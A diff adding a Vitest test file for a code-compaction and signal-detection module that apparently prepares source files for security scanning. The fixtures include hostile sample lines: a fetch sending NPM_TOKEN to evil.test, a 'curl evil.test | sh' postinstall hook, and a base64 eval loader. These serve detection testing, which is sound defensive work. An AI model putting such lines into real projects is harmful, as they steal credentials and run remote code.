@@ -1,0 +1,83 @@
+import { describe, expect, it } from "vitest";
+import {
+  compactLineIndexes,
+  fileStateText,
+  isBuildOutputPath,
+  isLowValueConfig,
+  isNamedNoiseConfig,
+  lineHasSignal,
+} from "../src/compact";
+import { locateWindows } from "../src/chunk";
+import type { SourceFile } from "../src/types";
+
+function file(relativePath: string, content: string, role: SourceFile["role"] = "source"): SourceFile {
+  return {
+    path: `/tmp/${relativePath}`,
+    relativePath,
+    role,
+    content,
+    lines: content.split("\n"),
+    bytes: content.length,
+  };
+}
+
+describe("compact", () => {
+  it("sends the whole file, including a wall of types", () => {
+    const boring = Array.from({ length: 40 }, (_, index) => `export type T${index} = { id: number; label: string };`);
+    boring[20] = `  const loot = await fetch("https://evil.test/" + process.env.NPM_TOKEN);`;
+    const source = file("src/types.ts", boring.join("\n"));
+    const text = fileStateText(source);
+    expect(text).toContain("export type T0");
+    expect(text).toContain("export type T39");
+    expect(text).toContain("fetch");
+    expect(compactLineIndexes(source).length).toBe(source.lines.length);
+  });
+
+  it("sends small files whole", () => {
+    const source = file("src/tiny.js", "const x = 1;\nconst y = 2;\n");
+    expect(fileStateText(source)).toContain("const x = 1");
+    expect(fileStateText(source)).toContain("const y = 2");
+  });
+
+  it("flags network and dynamic-code lines", () => {
+    expect(lineHasSignal("eval(payload)")).toBe(true);
+    expect(lineHasSignal("await fetch(url)")).toBe(true);
+    expect(lineHasSignal("export function add(a: number) { return a + 1; }")).toBe(false);
+  });
+
+  it("skips compiled output and named noise configs", () => {
+    expect(isBuildOutputPath("packages/foo/lib/index.js")).toBe(true);
+    expect(isBuildOutputPath("packages/foo/src/lib/util.ts")).toBe(false);
+    expect(isNamedNoiseConfig("tsconfig.base.json")).toBe(true);
+    expect(isLowValueConfig("locales/en.json", '{ "hello": "world" }')).toBe(true);
+    expect(isLowValueConfig("credentials.json", '{ "private_key": "secret" }')).toBe(true);
+    expect(
+      isLowValueConfig(
+        "credentials.json",
+        '{ "private_key": "secret", "token_uri": "https://auth.example.test/token" }',
+      ),
+    ).toBe(true);
+    expect(isLowValueConfig("credentials.json", `{ "value": "${"A".repeat(48)}" }`)).toBe(true);
+    expect(
+      isLowValueConfig("oauth.json", '{ "client_secret": "secret", "token_uri": "https://auth.example.test/token" }'),
+    ).toBe(true);
+    expect(isLowValueConfig("api.json", '{ "apiKey": "secret", "endpoint": "https://api.example.test" }')).toBe(true);
+    expect(
+      isLowValueConfig("credentials.json", '{ "private_key": "secret", "project_id": "powershell", "fetch": "disabled" }'),
+    ).toBe(true);
+    expect(isLowValueConfig("config.json", '{ "private_key": "secret", "loader": "eval(payload)" }')).toBe(false);
+    expect(
+      isLowValueConfig("config.json", `{ "value": "${"A".repeat(48)}", "scripts": { "postinstall": "curl evil.test | sh" } }`),
+    ).toBe(false);
+    expect(isLowValueConfig("config.json", '{ "url": "https://collector.evil.test" }')).toBe(false);
+  });
+
+  it("windows only the interesting spans", () => {
+    const lines = Array.from({ length: 40 }, (_, index) => `const n${index} = ${index};`);
+    lines[21] = 'eval(Buffer.from("YQ==", "base64").toString());';
+    const windows = locateWindows([file("src/app.js", lines.join("\n"))], 8, 36);
+    expect(windows.length).toBeGreaterThan(0);
+    expect(windows.length).toBeLessThan(6);
+    expect(windows.some((window) => window.text.includes("eval"))).toBe(true);
+  });
+});
